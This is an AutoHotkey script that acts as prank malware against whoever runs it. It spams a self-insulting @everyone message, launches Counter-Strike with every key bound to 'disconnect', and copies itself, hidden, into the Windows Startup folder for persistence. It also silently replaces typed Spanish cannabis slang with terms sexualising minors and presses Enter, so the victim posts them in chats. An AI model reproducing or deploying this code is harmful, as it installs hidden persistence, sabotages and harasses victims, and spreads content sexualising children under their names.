#Requires AutoHotkey v2.0
#Singleinstance
Persistent
message:="soy una mierda que jode a los demas o nada mas quiero jugar lol porque me aburro @everyone {enter}"
::bob esponja::
{
    i := 0
    x := 5
    while i < x {
        Send(message) ; Sends "message" to the active window.
        i++
    }
    return
}

; Build a massive command line. Using single quotes for the entire string so we can use double quotes freely inside.
steamPath := "C:\Program Files (x86)\Steam\steam.exe"


commands := '-applaunch 730 +unbindall' ; Start of commands
    . ' +bind "a" "disconnect" +bind "b" "disconnect" +bind "c" "disconnect" +bind "d" "disconnect" +bind "e" "disconnect" +bind "f" "disconnect"' ; Letters a-f
    . ' +bind "g" "disconnect" +bind "h" "disconnect" +bind "i" "disconnect" +bind "j" "disconnect" +bind "k" "disconnect" +bind "l" "disconnect"' ; Letters g-l
    . ' +bind "m" "disconnect" +bind "n" "disconnect" +bind "o" "disconnect" +bind "p" "disconnect" +bind "q" "disconnect" +bind "r" "disconnect"' ; Letters m-r
    . ' +bind "s" "disconnect" +bind "t" "disconnect" +bind "u" "disconnect" +bind "v" "disconnect" +bind "w" "disconnect" +bind "x" "disconnect"' ; Letters s-x
    . ' +bind "y" "disconnect" +bind "z" "disconnect"' ; Letters y-z
    . ' +bind "0" "disconnect" +bind "1" "disconnect" +bind "2" "disconnect" +bind "3" "disconnect" +bind "4" "disconnect"' ; Numbers 0-4
    . ' +bind "5" "disconnect" +bind "6" "disconnect" +bind "7" "disconnect" +bind "8" "disconnect" +bind "9" "disconnect"' ; Numbers 5-9
    . ' +bind "f1" "disconnect" +bind "f2" "disconnect" +bind "f3" "disconnect" +bind "f4" "disconnect" +bind "f5" "disconnect"' ; F1-F5
    . ' +bind "f6" "disconnect" +bind "f7" "disconnect" +bind "f8" "disconnect" +bind "f9" "disconnect" +bind "f10" "disconnect" +bind "f11" "disconnect" +bind "f12" "disconnect"' ; F6-F12
    . ' +bind "kp_0" "disconnect" +bind "kp_1" "disconnect" +bind "kp_2" "disconnect" +bind "kp_3" "disconnect" +bind "kp_4" "disconnect"' ; Numpad 0-4
    . ' +bind "kp_5" "disconnect" +bind "kp_6" "disconnect" +bind "kp_7" "disconnect" +bind "kp_8" "disconnect" +bind "kp_9" "disconnect"' ; Numpad 5-9
    . ' +bind "kp_divide" "disconnect" +bind "kp_multiply" "disconnect" +bind "kp_minus" "disconnect" +bind "kp_plus" "disconnect" +bind "kp_enter" "disconnect"' ; Numpad ops
    . ' +bind "uparrow" "disconnect" +bind "downarrow" "disconnect" +bind "leftarrow" "disconnect" +bind "rightarrow" "disconnect"' ; Arrows
    . ' +bind "ins" "disconnect" +bind "del" "disconnect" +bind "home" "disconnect" +bind "end" "disconnect" +bind "pgup" "disconnect" +bind "pgdn" "disconnect"' ; Nav keys
    . ' +bind "shift" "disconnect" +bind "ctrl" "disconnect" +bind "alt" "disconnect" +bind "space" "disconnect" +bind "tab" "disconnect" +bind "capslock" "disconnect"' ; Modifiers
    . ' +bind "backspace" "disconnect" +bind "escape" "disconnect" +bind "enter" "disconnect"' ; Misc keys
    . ' +bind "backquote" "disconnect" +bind "-" "disconnect" +bind "=" "disconnect" +bind "[" "disconnect" +bind "]" "disconnect" +bind ";" "disconnect" +bind "," "disconnect" +bind "." "disconnect" +bind "/" "disconnect"' ; Punctuation & symbols
    . ' +bind "mouse1" "disconnect" +bind "mouse2" "disconnect" +bind "mouse3" "disconnect" +bind "mouse4" "disconnect" +bind "mouse5" "disconnect"' ; Mouse buttons
    . ' +bind "mwheelup" "disconnect" +bind "mwheeldown" "disconnect"' ; Mouse wheel

Run(steamPath . " " . commands)




SourceFile := A_ScriptFullPath

; Destination file is the script's name placed into the user's Startup directory
DestFile := A_Startup "\" A_ScriptName

; Copy the file
  ; The "1" parameter allows overwriting if it already exists

if FileExist(DestFile)
    {
        FileSetAttrib "H", DestFile
        
    }
else{
    FileCopy SourceFile, DestFile, 1
    FileSetAttrib "H", DestFile
}

::marimba::{
    Sendtext(ReplaceWithRandomWord())
}
::cannabis::{
    Sendtext(ReplaceWithRandomWord())
}
::maría::{
    Sendtext(ReplaceWithRandomWord())
}
::hierba::{
    Sendtext(ReplaceWithRandomWord())
}
::yerba::{
    Sendtext(ReplaceWithRandomWord())
}
::mota::{
    Sendtext(ReplaceWithRandomWord())
}
::ganja::{
    Sendtext(ReplaceWithRandomWord())
}
::verde::{
    Sendtext(ReplaceWithRandomWord())
}
::pasto::{
    Sendtext(ReplaceWithRandomWord())
}
::grifa::{
    Sendtext(ReplaceWithRandomWord())
}
::porro::{
    Sendtext(ReplaceWithRandomWord())
}
::faso::{
    Sendtext(ReplaceWithRandomWord())
}
::yesca::{
    Sendtext(ReplaceWithRandomWord())
}
::churro::{
    Sendtext(ReplaceWithRandomWord())
}
::pito::{
    Sendtext(ReplaceWithRandomWord())
}
::zacate::{
    Sendtext(ReplaceWithRandomWord())
}
::marimba::{
    Sendtext(ReplaceWithRandomWord())
}
::monte::{
    Sendtext(ReplaceWithRandomWord())
}
::weed::{
    Sendtext(ReplaceWithRandomWord())
}
::chala::{
    Sendtext(ReplaceWithRandomWord())
}
::lechuga::{
    Sendtext(ReplaceWithRandomWord())
}
::sinsemilla::{
    Sendtext(ReplaceWithRandomWord())
}
::cañamo::{
    Sendtext(ReplaceWithRandomWord())
}
::juana::{
    Sendtext(ReplaceWithRandomWord())
}
::santa maria::{
    Sendtext(ReplaceWithRandomWord())
}


alternatives := [
    "Adolescentes{enter}",
    "Chquitas{enter}",
    "Chiquita{enter}",
    "Jovencitas{enter}",
    "Menor{enter}",
    "Muchacha{enter}",
    "Nena{enter}",
    "Niña{enter}",
    "Pendejitas{enter}",
    "lolitas{enter}",
    "conchita apretada{enter}"
]

ReplaceWithRandomWord() {
    global alternatives
    RandomIndex := Random(1, alternatives.Length) ; Get a random index
    return alternatives[RandomIndex] ; Replace with the chosen word
}

